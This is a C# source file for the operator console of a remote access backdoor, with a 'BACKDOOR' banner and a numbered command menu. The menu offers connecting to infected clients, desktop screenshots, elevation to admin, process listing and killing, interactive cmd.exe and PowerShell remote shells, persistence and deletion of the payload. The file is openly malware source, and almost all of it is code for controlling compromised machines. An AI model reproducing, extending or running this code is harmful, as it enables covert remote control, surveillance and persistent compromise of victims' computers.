using Server.Config;
using Server.Data;
using Server.Utils;
using System;
using System.Threading.Tasks;

namespace Server
{
    internal static class Program
    {
        private static readonly Serialize _Serialize = new Serialize();
        private static readonly Deserialize _Deserialize = new Deserialize();

        private static int _ID = 0x0;

        private static int ID
        {
            set
            {
                if (value < Network.Server.ID)
                    _ID = value;
            }
            get => _ID;
        }

        private static void Main()
        {
            Task.Factory.StartNew(() => Network.Server.Start(Settings.PORT));

            Console.Write(@"
    ██████╗  █████╗  ██████╗██╗  ██╗██████╗  ██████╗  ██████╗ ██████╗
    ██╔══██╗██╔══██╗██╔════╝██║ ██╔╝██╔══██╗██╔═══██╗██╔═══██╗██╔══██╗
    ██████╔╝███████║██║     █████╔╝ ██║  ██║██║   ██║██║   ██║██████╔╝
    ██╔══██╗██╔══██║██║     ██╔═██╗ ██║  ██║██║   ██║██║   ██║██╔══██╗
    ██████╔╝██║  ██║╚██████╗██║  ██╗██████╔╝╚██████╔╝╚██████╔╝██║  ██║
    ╚═════╝ ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚═════╝  ╚═════╝  ╚═════╝ ╚═╝  ╚═╝
");

            while (true)
            {
                Console.Write($"\n [ID: {ID}] Enter Command: ");

                SelectType(Console.ReadLine());
            }
        }

        private static void SelectType(string _Type)
        {
            switch (_Type)
            {
                case "1":
                    _Serialize.Data_XML.Command = _Type;
                    Console.Clear();
                    new IO().Input(_Serialize);
                    new IO().Output(_Deserialize);
                    break;

                case "2":
                    Console.Write("\n Enter ID: ");
                    ID = Convert.ToInt32(Console.ReadLine());
                    break;

                case "3":
                    _Serialize.Data_XML.Command = _Type;
                    new IO().Input(_Serialize, ID);
                    new IO().Output(_Deserialize, _ID);
                    break;

                case "4":
                    _Serialize.Data_XML.Command = _Type;
                    new IO().Input(_Serialize, ID);
                    new IO().Output(_Deserialize, _ID);
                    break;

                case "5":
                    _Serialize.Data_XML.Command = _Type;
                    new IO().Input(_Serialize, ID);
                    Network.Server.Restart();
                    break;

                case "6":
                    _Serialize.Data_XML.Command = _Type;
                    new IO().Input(_Serialize, ID);
                    new IO().Output(_Deserialize, _ID);
                    break;

                case "7":
                    _Serialize.Data_XML.Command = _Type;
                    new IO().Input(_Serialize, ID);
                    new IO().Output(_Deserialize, _ID);
                    break;

                case "8":
                    _Serialize.Data_XML.Command = _Type;
                    new IO().Input(_Serialize, ID);
                    new IO().Output(_Deserialize, _ID);
                    break;

                case "9":
                    Console.Write("\n Process ID: ");
                    _Serialize.Data_XML.Command = _Type;
                    _Serialize.Data_XML.Data = Console.ReadLine();
                    new IO().Input(_Serialize, ID);
                    new IO().Output(_Deserialize, _ID);
                    break;

                case "10":
                    while (true)
                    {
                        Console.Write("\n CMD: ");
                        _Serialize.Data_XML.Command = "Shell";
                        _Serialize.Data_XML.Data = Console.ReadLine();
                        _Serialize.Data_XML.Shell = "cmd.exe";
                        if (_Serialize.Data_XML.Data.ToLower() == "Q".ToLower())
                            break;
                        new IO().Input(_Serialize, ID);
                        new IO().Output(_Deserialize, _ID);
                    }
                    break;

                case "11":
                    while (true)
                    {
                        Console.Write("\n PS: ");
                        _Serialize.Data_XML.Command = "Shell";
                        _Serialize.Data_XML.Data = Console.ReadLine();
                        _Serialize.Data_XML.Shell = "powershell.exe";
                        if (_Serialize.Data_XML.Data.ToLower() == "Q".ToLower())
                            break;
                        new IO().Input(_Serialize, ID);
                        new IO().Output(_Deserialize, _ID);
                    }
                    break;

                case "12":
                    _Serialize.Data_XML.Command = _Type;
                    new IO().Input(_Serialize, ID);
                    new IO().Output(_Deserialize, _ID);
                    break;

                case "9999":
                    _Serialize.Data_XML.Command = _Type;
                    new IO().Input(_Serialize, ID);
                    new IO().Output(_Deserialize, _ID);
                    break;

                case "1000":
                    Console.Clear();
                    break;

                case "100":
                    Console.Write("\n" +
                    " [1]    => List Clients \n" +
                    " [2]    => Connect To Client \n" +
                    " [3]    => System Information \n" +
                    " [4]    => Screenshot Desktop \n" +
                    " [5]    => Elevate To Admin \n" +
                    " [6]    => Path Installed Payload \n" +
                    " [7]    => Installed Applications \n" +
                    " [8]    => List Processes \n" +
                    " [9]    => Process Kill \n" +
                    " [10]   => Command Line Interpreter \n" +
                    " [11]   => PowerShell \n" +
                    " [12]   => Persistence \n");
                    Console.ForegroundColor = ConsoleColor.Green;
                    Console.Write("" +
                    " [100]  => Help \n" +
                    " [1000] => Clear Console \n");
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.Write(" [9999] => Delete Payload \n");
                    Console.ResetColor();
                    break;
            }
        }
    }
}